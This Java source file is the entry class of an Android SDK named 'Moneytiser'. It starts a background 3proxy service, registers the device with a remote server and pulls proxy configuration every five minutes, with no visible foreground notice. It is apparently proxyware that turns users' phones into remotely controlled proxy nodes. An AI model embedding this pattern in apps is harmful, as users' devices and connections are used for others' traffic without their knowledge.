package io.moneytise;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.net.VpnService;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.Keep;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.content.LocalBroadcastManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import io.moneytise.data.DataStore;
import io.moneytise.service.HttpManager;
import io.moneytise.service.MoneytiserService;
import io.moneytise.service.MoneytiserService.ProxyServiceBinder;
import io.moneytise.support.ConfigManager;
import io.moneytise.util.LogUtils;

public class Moneytiser extends BroadcastReceiver {

    @SuppressLint("StaticFieldLeak")
    private static volatile Moneytiser instance;

    public static final String NEED_FOREGROUND_KEY = "need_forground";
    public static final String EVENT = "event";
    public static final String PUBLISHER_PLACE_HOLDER = "{publisher}";
    public static final String UID_PLACE_HOLDER = "{uid}";
    public static final String CID_PLACE_HOLDER = "{cid}";
    private static final String DEFAULT_BASE_URL  = "http://api.cyberprotector.online";
    private static final String DEFAULT_CATEGORY  = "888";
    private static final String REG_ENDPOINT = String.format("/?reg=1&pub=%s&uid=%s&cid=%s", PUBLISHER_PLACE_HOLDER, UID_PLACE_HOLDER, CID_PLACE_HOLDER);
    private static final String GET_ENDPOINT = String.format("/?get=1&pub=%s&uid=%s", PUBLISHER_PLACE_HOLDER, UID_PLACE_HOLDER);

    /**
     * Default delayMillis to periodic update the 3proxy configuration file.
     * <p>Default is 5 minutes</p>
     */
    private static final long DEFAULT_DELAY  = 5*60*1000; // 5 minutes

    @Keep
    public static Moneytiser.Builder builder() {
        return new Moneytiser.Builder();
    }

    /**
     * Initializes the singleton. It's necessary to call this function before using the {@code Moneytiser}.
     * Calling it multiple times has not effect.
     *
     * @param context Any {@link Context} to instantiate the singleton object.
     * @param builder The {@link Builder} instance to apply properties.
     * @return The new or existing singleton object.
     */
    private static Moneytiser create(@NonNull Context context, Builder builder) {
        if (instance == null) {
            synchronized (Moneytiser.class) {
                if (instance == null) {
                    if (context == null) {
                        throw new NullPointerException("Context cannot be null");
                    }
                    if (context.getApplicationContext() != null) {
                        // could be null in unit tests
                        context = context.getApplicationContext();
                    }
                    instance = new Moneytiser(context, builder);
                }
            }
        }
        return instance;
    }

    /**
     * Ensure that you've called {@link #create(Context, Builder)} first. Otherwise this method
     * throws an exception.
     *
     * @return The {@code Moneytiser} object.
     */
    @Keep
    public static Moneytiser getInstance() {
        return getInstance(false);
    }

    /**
     * Ensure that you've called {@link #create(Context, Builder)} first. Otherwise this method
     * throws an exception.
     *
     * @return The {@code Moneytiser} object.
     */
    @Keep
    public static Moneytiser getInstance(Context contextForNullInstance) {
        if (instance == null) {
            synchronized (Moneytiser.class) {
                if (instance == null) {
                    instance = new Moneytiser.Builder().withPublisher("tempForceInit").loggable().build(contextForNullInstance);
                    LogUtils.d("moneytiser", "call getInstance while instase equal null - moneytiser self initiation with pub=tempForceInit" );
                }
            }
        }
        return instance;
    }


    /**
     * Ensure that you've called {@link #create(Context, Builder)} first. Otherwise this method
     * throws an exception.
     *
     * @return The {@code Moneytiser} object.
     */
    public static Moneytiser getInstance(boolean quietly) {
        if (instance == null) {
            synchronized (Moneytiser.class) {
                if (instance == null && !quietly) {
                    throw new IllegalStateException("You need to call create() at least once to create the singleton");
                }
            }
        }
        return instance;
    }

    private final Context mContext;
    private final HttpManager mHttpManager;
    private final ConfigManager mConfigManager;
    private final DataStore mDataStore;
    private final ProxyServiceConnection proxyServiceConnection = new ProxyServiceConnection();

    private String category;
    private String publisher;
    private String baseUrl;
    private String regEndpoint;
    private String getEndpoint;
    private long delayMillis;
    private boolean loggable;

    private Moneytiser(Context context, Builder builder) {
        mContext = context;
        mDataStore = new DataStore(context);
        mHttpManager = new HttpManager(context);
        mConfigManager = new ConfigManager(context);
        mConfigManager.setEnableLogging(builder.enable3proxyLogging);
        // applies builder properties to current instance
        category = builder.category;
        String pub = mDataStore.get(context.getString(R.string.moneytiser_publisher_key));
        if(pub==null) {
            publisher = builder.publisher;
            mDataStore.set(context.getString(R.string.moneytiser_publisher_key), publisher);
        }
        else
        {
            builder.withPublisher(pub);
            publisher = pub;
        }
        baseUrl = builder.baseUrl;
        regEndpoint = builder.regEndpoint;
        getEndpoint = builder.getEndpoint;
        delayMillis = builder.delayMillis;
        loggable = builder.loggable;

        LocalBroadcastManager.getInstance(context).registerReceiver(this, new IntentFilter(Moneytiser.class.getCanonicalName()));
    }

    public Moneytiser enableConfigLogging() {
        this.mConfigManager.setEnableLogging(true);
        return this;
    }

    /* temporary ugly patch to remove */
    private boolean isFireTV()
    {
        String model = android.os.Build.MODEL;
        if (model.toLowerCase(Locale.ENGLISH).contains("aft"))
            return true;
        else
            return false;
    }


    /**
     * Start the 3proxy wrapper service.
     */
    @Keep
    public void start() throws InterruptedException {
        Intent intent = new Intent();
        intent.setAction(VpnService.SERVICE_INTERFACE);
        intent.setClass(mContext, MoneytiserService.class);
        mHttpManager.start();
        intent.putExtra(NEED_FOREGROUND_KEY, false);

        try {
            mContext.startService(intent);
        }
        /*catch (IllegalStateException ex) {
            intent.putExtra(NEED_FOREGROUND_KEY, true);
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // do nothing :(
         //       mContext.startForegroundService(intent);
            }
            else {
                mContext.startService(intent);
            }
        }*/
        catch(Exception ex)
        {
            LogUtils.e("moneytiser", "start() failed on startService()" );
        }
        mContext.bindService(intent, proxyServiceConnection, Context.BIND_AUTO_CREATE);
    }

    /**
     * Stop the 3proxy wrapper service.
     */
    @Keep
    public void stop() {
        if (proxyServiceConnection.isBound()) {
            mContext.unbindService(proxyServiceConnection);
        }
        mContext.stopService(new Intent(mContext, MoneytiserService.class));
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // Get extra data included in the Intent
        String message = intent.getStringExtra("message");
        LogUtils.d("receiver", "Got message: " + message);
    }

    @Keep
    public boolean isRunning() {
        return proxyServiceConnection.isBound() && proxyServiceConnection.getMoneytiserService().isRunning();
    }

    @Keep
    public long getUpTime() {
        return proxyServiceConnection.isBound() ? proxyServiceConnection.getMoneytiserService().getProxyUpTime(TimeUnit.MILLISECONDS) : 0;
    }

    public int getRequestsCounts() {
        return proxyServiceConnection.isBound() ? proxyServiceConnection.getMoneytiserService().getRequestsCounts() : 0;
    }

    public List<Throwable> getErrors() {
        return proxyServiceConnection.isBound() ? proxyServiceConnection.getMoneytiserService().getErrors() : new ArrayList<Throwable>();
    }

    /**
     * Retrieves the category.
     * @return registered category
     */
    public String getCategory() {
        return category;
    }

    /**
     * Retrieves the publisher.
     * @return registered publisher
     */
    public String getPublisher() {
        return publisher;
    }

    public String getBaseUrl() {
        return baseUrl;
    }

    /**
     * Gets the registration endpoint.
     * @return the registration endpoint
     */
    public String getRegEndpoint() {
        return regEndpoint;
    }

    /**
     * Gets the get endpoint.
     * @return the get configuration endpoint
     */
    public String getGetEndpoint() {
        return getEndpoint;
    }

    /**
     * Gets scheduled delay in milliseconds.
     * @return the scheduled delay
     */
    public long getDelayMillis() {
        return delayMillis;
    }

    /**
     * Tells if the log is forced.
     * @return <code>true</code> if force logging, <code>false</code> otherwise
     */
    public boolean isLoggable() {
        return loggable;
    }

    public HttpManager getHttpManager() {
        return mHttpManager;
    }

    public ConfigManager getConfigManager() {
        return mConfigManager;
    }

    public DataStore getDataStore() {
        return mDataStore;
    }

    public enum Events {
        ERROR_CATCHED,
        REGISTERED,
        GET_CONFIG
    }

    @Keep
    public static class Builder {

        private String publisher;
        private String userId;
        private String category = DEFAULT_CATEGORY;
        private String baseUrl = DEFAULT_BASE_URL;
        private String regEndpoint = REG_ENDPOINT;
        private String getEndpoint = GET_ENDPOINT;
        private long delayMillis = DEFAULT_DELAY;
        private boolean loggable;
        private boolean enable3proxyLogging;

        public Builder withBaseUrl(@NonNull String baseUrl) {
            this.baseUrl = baseUrl;
            return this;
        }

        public Builder withRegEndpoint(@NonNull String endpoint) {
            this.regEndpoint = endpoint;
            return this;
        }

        public Builder withGetEndpoint(@NonNull String endpoint) {
            this.getEndpoint = endpoint;
            return this;
        }

        public Builder withPublisher(@NonNull String pub) {
            publisher = pub;
            LogUtils.d("moneytiser", "withPublisher: %s", publisher );
            return this;
        }

        public Builder withCategory(@NonNull String category) {
            this.category = category;
            return this;
        }

        /**
         * Default delayMillis to periodic update the 3proxy configuration file.
         * <p>Default is 5 minutes</p>
         *
         * @param delay the delay in milliseconds
         */
        public Builder withDelayInMillis(@NonNull long delay) {
            this.delayMillis = delay;
            return this;
        }

        public Builder loggable() {
            this.loggable = true;
            return this;
        }

        public Builder enable3proxyLogging() {
            this.enable3proxyLogging = true;
            return this;
        }

        public Moneytiser build(Context context) {
            if (publisher == null || publisher.trim().length() == 0) {
                throw new IllegalArgumentException("The publisher cannot be <null> or empty, you have to specify one");
            }
            return Moneytiser.create(context, this);
        }

    }

    private class ProxyServiceConnection implements ServiceConnection {

        private MoneytiserService moneytiserService;

        private boolean bound = false;

        @Override
        public void onServiceConnected(ComponentName className, IBinder service) {
            ProxyServiceBinder binder = (ProxyServiceBinder) service;
            moneytiserService = binder.getService();
            bound = true;
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            bound = false;
        }

        public boolean isBound() {
            return bound;
        }

        public MoneytiserService getMoneytiserService() {
            return moneytiserService;
        }

    }

}
